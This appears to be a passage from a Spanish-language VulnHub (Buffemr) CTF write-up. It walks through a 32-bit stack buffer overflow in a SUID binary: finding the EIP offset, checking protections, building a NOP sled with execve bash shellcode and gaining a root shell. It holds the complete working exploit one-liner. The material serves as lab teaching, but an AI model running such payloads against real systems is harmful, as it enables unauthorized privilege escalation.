gef➤  r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/miguelrega7/VulnHub/Bufferm/content/binary AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffce3c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffd600  →  0x434c0041 ("A"?)
$edx   : 0xffffd186  →  0xded80041 ("A"?)
$esp   : 0xffffd040  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7bfc000  →  0x001e4d6c
$edi   : 0xf7bfc000  →  0x001e4d6c
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd040│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
0xffffd044│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd048│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd04c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd050│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd054│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd058│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd05c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary", stopped 0x41414141 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

El programa partio en `$esp` con nuestras cadenas pero pues empieza a sobrescribir nuestros registros asta sobrescribir `eip` que `eip` es donde esta contenida la direccion a la cual tiene que ir el flujo del programa para ejecutar las nuevas instrucciones nosotros estamos haciendo que `eip` apunte a esta direccion `$eip   : 0x41414141 ("AAAA"?)` la cual no es una direccion existente y como el programa no sabe cual es esa direccion pues se corrompe

Ahora tenemos que saber cual es el `offset` es saber cuantas `A` tenemos que escribir para llegar al `eip` tenemos que saber cuantas `A` necesitamos introducir para que en el `eip` podamos poner lo que queramos que pase

Vamos a enviar un payload que nos genera `gef`

```bash
gef➤  patter create 
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef0'
gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
Starting program: /home/miguelrega7/VulnHub/Bufferm/content/binary aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabw
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcd8c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x66616162 ("baaf"?)
$ecx   : 0xffffd600  →  0x434c006b ("k"?)
$edx   : 0xffffd18b  →  0xffd1006b ("k"?)
$esp   : 0xffffcf90  →  "eaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqa[...]"
$ebp   : 0x66616163 ("caaf"?)
$esi   : 0xf7bfc000  →  0x001e4d6c
$edi   : 0xf7bfc000  →  0x001e4d6c
$eip   : 0x66616164 ("daaf"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf90│+0x0000: "eaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqa[...]"	← $esp
0xffffcf94│+0x0004: "faafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafra[...]"
0xffffcf98│+0x0008: "gaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsa[...]"
0xffffcf9c│+0x000c: "haafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaafta[...]"
0xffffcfa0│+0x0010: "iaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafua[...]"
0xffffcfa4│+0x0014: "jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafva[...]"
0xffffcfa8│+0x0018: "kaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwa[...]"
0xffffcfac│+0x001c: "laafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxa[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x66616164
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary", stopped 0x66616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Ahora `$eip` vale esto que basicamente en una parte del payload que nos creo viene la palabra `daaf` y en esa parte el programa corrompio y hay se sobrescribio el `$eip` y ahora tenemos que saber cuantos caracteres son

```bash
$eip   : 0x66616164 ("daaf"?)
```

Necesitamos introducir `512` caracteres

```bash
gef➤  patter offset $eip
[+] Searching for '$eip'
[+] Found at offset 512 (little-endian search) likely
[+] Found at offset 320 (big-endian search) 
gef➤ 
```

Ahora vamos a comprobar si introduciendo `512` caracteres lo siguientes nos permiten controlar lo que queremos poner en `$eip` vamos a usar `Python3` para esto si lo estamos sobrescribiendo el `$eip` nos tiene que mostrar el valor en `hexadecimal` de `B` por que como ya introducimos `512` ahora introducimos otras 4 `B` pues ya lo sobrescribimos

```bash
gef➤  r $(python3 -c 'print("A"*512 + "B"*4)')
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd180│+0x0000: 0xffffd300  →  0x000033 ("3"?)	← $esp
0xffffd184│+0x0004: 0xffffd254  →  0xffffd3cc  →  "/home/miguelrega7/VulnHub/Bufferm/content/binary"
0xffffd188│+0x0008: 0xffffd260  →  0xffffd602  →  "LC_TIME=es_MX.UTF-8"
0xffffd18c│+0x000c: 0x565556e2  →  <main+20> add eax, 0x18e2
0xffffd190│+0x0010: 0xffffd1b0  →  0x00000002
0xffffd194│+0x0014: 0x00000000
0xffffd198│+0x0018: 0x00000000
0xffffd19c│+0x001c: 0xf7a31e46  →  <__libc_start_main+262> add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary", stopped 0x42424242 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

como vemos `$eip` vale `0x42424242` y `$ebp` vale `0x41414141` que son las `A` pues se esta sobrescriendo `ebp` es lo que esta antes de llegar al `eip`

Para comprobar esto vamos a modificar para que en vez de `B` nos diga `XDXD`

```bash
gef➤  r $(python3 -c 'print("A"*512 + "XDXD")')
```

Y funciona

```bash
$eax   : 0xffffcf7c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffd600  →  0x434c0044 ("D"?)
$edx   : 0xffffd17f  →  0xffd30044 ("D"?)
$esp   : 0xffffd180  →  0xffffd300  →  0x000033 ("3"?)
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7bfc000  →  0x001e4d6c
$edi   : 0xf7bfc000  →  0x001e4d6c
$eip   : 0x44444458 ("XDDD"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd180│+0x0000: 0xffffd300  →  0x000033 ("3"?)	← $esp
0xffffd184│+0x0004: 0xffffd254  →  0xffffd3cc  →  "/home/miguelrega7/VulnHub/Bufferm/content/binary"
0xffffd188│+0x0008: 0xffffd260  →  0xffffd602  →  "LC_TIME=es_MX.UTF-8"
0xffffd18c│+0x000c: 0x565556e2  →  <main+20> add eax, 0x18e2
0xffffd190│+0x0010: 0xffffd1b0  →  0x00000002
0xffffd194│+0x0014: 0x00000000
0xffffd198│+0x0018: 0x00000000
0xffffd19c│+0x001c: 0xf7a31e46  →  <__libc_start_main+262> add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x44444458
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary", stopped 0x44444458 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Lo que tenemos que hacer que el flujo del programa el `$eip` apunte a una direccion en la que nosotros podamos llegar a ejecutar cosas

Vamos a ver si hay protecciones y `NX` esta desactivado esto nos permite que directamente podemos aprovecharnos de la pila para en vez de poner `A` como nosotros controlamos `$eip` si introducimos `shellcode` para poder ejecutar instrucciones maliciosas y apuntar a una direccion que nosotros queramos si hubiara estado habilitado el `NX` pues hay otras tecnicas como el `red2libc` que es otro tipo de `buffer overflow`


```bash
gef➤  checksec
[+] checksec for '/home/miguelrega7/VulnHub/Bufferm/content/binary'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
gef➤  
```

Ahora vamos a meter `NOPS` no va a hacer nada por que es una instruccion que no hace nada primero introducimos `NOPS` despues el `shellcode` que es la instruccion maliciosa para que con `$eip` apuntemos a una direccion intermetida de los `NOPS` para que cuando caiga en una direccion de los `NOPS` como no va a hacer nada nos lleve directamente al shellcode es como una forma desplazarnos a donde como atacante nos interesa

Vamos a buscar un `shellcode` que al interpretarse nos de una `bash -p` para que no la otorge como el propiertario del binario que en este caso es `root`

Encontramos este pero es de `33` bytes algo que tenemos que tener en cuenta es que no tenemos que exceder el tamaño maximo de bytes vamos empezar a hacerlo desde la maquina victima

Como sabemos eso es `$eip`

```bash
buffemr@buffemr:/opt$ gdb ./dontexecute -q
Reading symbols from ./dontexecute...(no debugging symbols found)...done.
(gdb) r $(python3 -c 'print("A"*512 + "B"*4)')
Starting program: /opt/dontexecute $(python3 -c 'print("A"*512 + "B"*4)')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
```

Ahora vamos a meter los `NOPS` pero a `512` caraceteres que necesitamos tenemos que restarle `33` bytes que mide el `shellcode ` que `512-33=479`  y `$eip` sigue valiendo `0x42424242`

```bash
(gdb) r $(python -c 'print("\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x6
2\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "B"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/dontexecute $(python -c 'print("\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "B"*4)')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
```

Vamos a ver la pila todas esas son direcciones `0x90` son mis `NOPS` 

```bash
(gdb) x/300wx $esp
0xffffd350:	0xffffd500	0xffffd414	0xffffd420	0x565556e2
0xffffd360:	0xffffd380	0x00000000	0x00000000	0xf7c74f21
0xffffd370:	0xf7e31000	0xf7e31000	0x00000000	0xf7c74f21
0xffffd380:	0x00000002	0xffffd414	0xffffd420	0xffffd3a4
0xffffd390:	0x00000002	0xffffd414	0xf7e31000	0xf7fe570a
0xffffd3a0:	0xffffd410	0x00000000	0xf7e31000	0x00000000
0xffffd3b0:	0x00000000	0xa81a45ef	0xd92083ff	0x00000000
0xffffd3c0:	0x00000000	0x00000000	0x00000040	0xf7ffd024
0xffffd3d0:	0x00000000	0x00000000	0xf7fe5819	0x56556fc4
0xffffd3e0:	0x00000002	0x56555560	0x00000000	0x56555591
0xffffd3f0:	0x565556ce	0x00000002	0xffffd414	0x565557c0
0xffffd400:	0x56555820	0xf7fe5960	0xffffd40c	0xf7ffd940
0xffffd410:	0x00000002	0xffffd55b	0xffffd56c	0x00000000
0xffffd420:	0xffffd771	0xffffdd5d	0xffffdd7d	0xffffdd9f
0xffffd430:	0xffffddae	0xffffddbf	0xffffddc8	0xffffddf7
0xffffd440:	0xffffde19	0xffffde2b	0xffffde38	0xffffde41
0xffffd450:	0xffffde4a	0xffffde5d	0xffffde74	0xffffde8e
0xffffd460:	0xffffdeae	0xffffdec7	0xffffded3	0xffffdeea
0xffffd470:	0xffffdef5	0xffffdf05	0xffffdf32	0xffffdf3a
0xffffd480:	0xffffdf4a	0xffffdf69	0xffffdfc7	0x00000000
0xffffd490:	0x00000020	0xf7fd5b50	0x00000021	0xf7fd5000
0xffffd4a0:	0x00000010	0x0f8bfbff	0x00000006	0x00001000
0xffffd4b0:	0x00000011	0x00000064	0x00000003	0x56555034
0xffffd4c0:	0x00000004	0x00000020	0x00000005	0x00000009
0xffffd4d0:	0x00000007	0xf7fd6000	0x00000008	0x00000000
0xffffd4e0:	0x00000009	0x56555560	0x0000000b	0x000003e8
0xffffd4f0:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
---Type <return> to continue, or q <return> to quit---
0xffffd500:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xffffd510:	0x00000019	0xffffd53b	0x0000001a	0x00000000
0xffffd520:	0x0000001f	0xffffdfe7	0x0000000f	0xffffd54b
0xffffd530:	0x00000000	0x00000000	0x60000000	0xa274c39e
0xffffd540:	0x7a082bde	0x63794485	0x699dc17e	0x00363836
0xffffd550:	0x00000000	0x00000000	0x2f000000	0x2f74706f
0xffffd560:	0x746e6f64	0x63657865	0x00657475	0x90909090
0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd600:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd610:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd620:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd630:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd640:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd650:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd660:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd670:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd680:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd690:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6a0:	0x90909090	0x90909090	0x90909090	0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffd6b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd700:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd710:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd720:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd730:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd740:	0x90909090	0x90909090	0x6a909090	0x5299580b
0xffffd750:	0x702d6866	0x6a52e189	0x622f6868	0x2f687361
0xffffd760:	0x896e6962	0x535152e3	0x80cde189	0x42424242
0xffffd770:	0x5f534c00	0x4f4c4f43	0x723d5352	0x3a303d73
0xffffd780:	0x303d6964	0x34333b31	0x3d6e6c3a	0x333b3130
0xffffd790:	0x686d3a36	0x3a30303d	0x343d6970	0x33333b30
0xffffd7a0:	0x3d6f733a	0x333b3130	0x6f643a35	0x3b31303d
0xffffd7b0:	0x623a3533	0x30343d64	0x3b33333b	0x633a3130
0xffffd7c0:	0x30343d64	0x3b33333b	0x6f3a3130	0x30343d72
0xffffd7d0:	0x3b31333b	0x6d3a3130	0x30303d69	0x3d75733a
0xffffd7e0:	0x343b3733	0x67733a31	0x3b30333d	0x633a3334
0xffffd7f0:	0x30333d61	0x3a31343b	0x333d7774	0x32343b30
(gdb) 
```

El `shellcode` mas o menos comienza por aqui

```bash
0xffffd750:	0x702d6866	0x6a52e189	0x622f6868	0x2f687361
0xffffd760:	0x896e6962	0x535152e3	0x80cde189	0x42424242
0xffffd770:	0x5f534c00	0x4f4c4f43	0x723d5352	0x3a303d73
0xffffd780:	0x303d6964	0x34333b31	0x3d6e6c3a	0x333b3130
0xffffd790:	0x686d3a36	0x3a30303d	0x343d6970	0x33333b30
0xffffd7a0:	0x3d6f733a	0x333b3130	0x6f643a35	0x3b31303d
0xffffd7b0:	0x623a3533	0x30343d64	0x3b33333b	0x633a3130
0xffffd7c0:	0x30343d64	0x3b33333b	0x6f3a3130	0x30343d72
0xffffd7d0:	0x3b31333b	0x6d3a3130	0x30303d69	0x3d75733a
0xffffd7e0:	0x343b3733	0x67733a31	0x3b30333d	0x633a3334
0xffffd7f0:	0x30333d61	0x3a31343b	0x333d7774	0x32343b30
```

Ahora vamos a tomar una direccion por ejemplo esta `0xffffd720` que hay esta los `NOPS` y como no va a hacer nada estamos forzando el desplazamiento asta que llegue al shellcode y nos ejecute una bash

Algo a tener en cuenta es que como estamos en `32` bits tenemos que darle la vuelta ala direccion por que esta `litte-endian`

Entonces quedaria asi

```bash
0xffffd710         \x10\xd7\xff\xff
```

Bueno mi shellcode se ah ejecutado ejecuta la bash

```bash
(gdb) r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x6
2\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x10\xd7\xff\xff"')
Starting program: /opt/dontexecute $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x10\xd7\xff\xff"')
process 6127 is executing new program: /bin/bash
buffemr@buffemr:/opt$ 
```

Ahora lo vamos a ejecutar fuera del `gdb` y le vamos a pasar el `shellcode` como argumento y terminamos la maquina

```bash
buffemr@buffemr:/opt$ ./dontexecute $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x10\xd7\xff\xff"')
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
Root_flag.txt  snap
bash-4.4# cat Root_flag.txt 
                                                                                                                                          
                                                                                                                                            
________                __  __                       ____                                  _____                                        ___ 
`MMMMMMMb.             69MM69MM                     6MMMMb                                69M`MM                                        `MM 
 MM    `Mb            6M' 6M' `                    8P    Y8                              6M' `MM                                         MM 
 MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM 
 MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M' 6MMMMb `MM 6MM MMMMM MM  6MMMMMb `MM(   ,M.   )M' 6MMMMb   6MMMMMM 
 MMMMMMM(   MM    MM  MM  MM6M'  `Mb MM69 "       MM      MM  `Mb    d' 6M'  `Mb MM69 "  MM   MM 6M'   `Mb `Mb   dMb   d' 6M'  `Mb 6M'  `MM 
 MM    `Mb  MM    MM  MM  MMMM    MM MM'          MM      MM   YM.  ,P  MM    MM MM'     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM 
 MM     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  `Mb d'`Mb d'  MMMMMMMM MM    MM 
 MM     MM  MM    MM  MM  MMMM       MM           YM      M9    `Mbd'   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM 
 MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM'  `MM'   YM    d9 YM.  ,MM 
_MMMMMMM9'   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
________                                           ___        8   8                                                                         
`MMMMMMMb.                                         `MM       (M) (M)                                                                        
 MM    `Mb                      /                   MM       (M) (M)                                                                        
 MM     MM   _____     _____   /M      ____     ____MM       (M) (M)                                                                        
 MM     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         
 MM    .M9 6M'   `Mb 6M'   `Mb MM    6M'  `Mb 6M'  `MM        M   M                                                                         
 MMMMMMM9' MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         
 MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         
 MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      
 MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        
_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  


COngratulations !!! Tweet me at @san3ncrypt3d ! 



bash-4.4# 
```

Este `Buffer Overflow` fue sencillo hay mas dificiles los binarios de windows tenemos que usar `inmunity debugger` y usar `python` para enviarle los caracteres y ver donde se corrompe el programa y usar tambien `mona` para hacer lo que estabamos haciendo con el `gdb` pero desde el `debugger` en `windows` si quieres aprender mas sobre `buffer overflow` te dejo estos `posts` que encontre interesantes

<https://mikerega7.github.io/vulnhub-writeup-bf/>

<https://xdann1.github.io/posts/buffer-overflow/>

<https://pajarraco4444.github.io/writeups/>

Por ejemplo en esta maquina estoy explotando un binario de windows 

![](/assets/images/vh-writeup-buffemr/final.png)



